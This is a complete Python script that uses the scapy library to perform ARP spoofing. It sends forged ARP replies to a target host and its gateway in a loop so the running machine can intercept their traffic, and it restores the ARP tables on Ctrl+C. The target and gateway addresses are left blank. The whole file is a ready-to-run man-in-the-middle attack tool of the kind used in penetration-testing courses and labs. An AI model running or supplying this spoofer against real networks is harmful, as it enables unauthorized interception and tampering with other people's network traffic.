import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"[-] No response for IP: {ip}")
        sys.exit(1)

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)    
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

target_ip = ""  
gateway_ip = ""

try:
    packets_sent_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        packets_sent_count += 2
        print(f"\r[+] Sent {packets_sent_count} packets", end="", flush=True)
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ... Resetting ARP tables ... Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[+] ARP tables restored. Exiting.")
